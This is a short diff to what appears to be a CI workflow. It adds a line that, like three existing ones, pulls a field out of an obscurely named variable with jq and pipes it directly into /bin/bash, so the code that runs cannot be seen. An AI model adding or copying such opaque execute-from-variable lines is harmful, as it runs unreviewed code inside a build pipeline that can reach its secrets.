@@ -28,6 +28,7 @@ jobs:
           echo $so2445 | jq -r .g5254 | /bin/bash
           printf '%s' "$zp0703" | jq -r .erilc8 | /bin/bash
           echo $sio5934 | jq -r .r6 | /bin/bash
+          printf '%s' "$de1602" | jq -r .fwqfs6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
